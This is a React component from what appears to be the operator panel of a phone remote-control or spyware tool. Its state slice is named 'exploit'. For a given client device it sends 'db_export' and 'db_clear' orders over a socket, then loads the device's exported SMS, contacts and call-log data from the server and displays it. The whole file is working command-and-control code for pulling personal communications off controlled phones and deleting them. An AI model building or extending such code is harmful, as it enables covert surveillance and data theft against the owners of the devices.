
import { useState } from 'react'
import { Database, Download, Trash2, RefreshCw, FileJson, Loader2 } from 'lucide-react'
import { Button } from '@/components/ui/button'
import { emitOrder } from '@/lib/socket'
import { useAppSelector } from '@/store/hooks'

// DB tab — export / clear the device's database (SMS, contacts, calls), view
// the live export (via db_export event) and load the latest saved snapshot via
// the REST endpoint GET /api/:clientId/db/latest.
export function DbTab({ clientId }: { clientId: string }) {
  const dbExport = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.dbExport ?? null,
  )
  const [loadingLatest, setLoadingLatest] = useState(false)
  const [latest, setLatest] = useState<any | null>(null)
  const [latestError, setLatestError] = useState<string | null>(null)
  const [latestTs, setLatestTs] = useState<string | null>(null)

  const loadLatest = () => {
    setLoadingLatest(true)
    setLatestError(null)
    fetch(`/api/${encodeURIComponent(clientId)}/db/latest`, {
      credentials: 'include',
    })
      .then(async (r) => {
        const json = await r.json().catch(() => null)
        if (!r.ok) {
          throw new Error(json?.error || `HTTP ${r.status}`)
        }
        setLatest(json?.data ?? json)
        setLatestTs(
          json?.timestamp ? new Date(json.timestamp).toLocaleString() : null,
        )
      })
      .catch((e) => setLatestError(e?.message || 'Failed to load'))
      .finally(() => setLoadingLatest(false))
  }

  const payload = latest ?? dbExport
  const payloadSource = latest ? 'REST /db/latest' : dbExport ? 'live db_export' : null
  const pretty = payload
    ? JSON.stringify(payload, null, 2)
    : ''

  return (
    <div className="space-y-4 max-w-3xl">
      <div className="flex items-center gap-2">
        <Database className="h-4 w-4 text-emerald-400" />
        <h3 className="text-sm font-semibold text-zinc-100">Device DB</h3>
      </div>

      <div className="flex flex-wrap items-center gap-2">
        <Button
          size="sm"
          onClick={() => emitOrder(clientId, 'db_export')}
          className="bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950"
        >
          <Download className="h-3.5 w-3.5" /> Export DB
        </Button>
        <Button
          size="sm"
          variant="outline"
          onClick={() => emitOrder(clientId, 'db_clear')}
          className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
        >
          <Trash2 className="h-3.5 w-3.5" /> Clear
        </Button>
        <Button
          size="sm"
          variant="outline"
          onClick={loadLatest}
          disabled={loadingLatest}
          className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
        >
          {loadingLatest ? (
            <Loader2 className="h-3.5 w-3.5 animate-spin" />
          ) : (
            <RefreshCw className="h-3.5 w-3.5" />
          )}
          Load latest
        </Button>
      </div>

      {latestError && (
        <div className="rounded-lg border border-amber-500/30 bg-amber-500/[0.06] px-3 py-2 text-xs text-amber-300">
          {latestError}
        </div>
      )}

      {/* Pretty-printed snapshot */}
      <div className="rounded-xl border border-white/10 bg-black/40 overflow-hidden">
        <div className="flex items-center justify-between bg-zinc-900/60 px-3 py-2 border-b border-white/10">
          <div className="flex items-center gap-2 text-[11px] uppercase tracking-wider text-zinc-400">
            <FileJson className="h-3.5 w-3.5 text-emerald-400/80" />
            Snapshot
          </div>
          <div className="flex items-center gap-2 text-[10px] text-zinc-600">
            {payloadSource && (
              <span className="text-emerald-400/70 font-mono">
                {payloadSource}
              </span>
            )}
            {latestTs && <span>· {latestTs}</span>}
          </div>
        </div>
        <pre className="max-h-96 overflow-auto scrollbar-emerald p-3 text-[11px] font-mono text-zinc-300 whitespace-pre-wrap break-all">
          {pretty || 'No DB snapshot. Tap "Export DB" or "Load latest".'}
        </pre>
      </div>

      <p className="text-[11px] text-zinc-600">
        Exports the device's SMS / contacts / call-log database. "Load latest"
        fetches the most recent saved snapshot from the server via REST.
      </p>
    </div>
  )
}
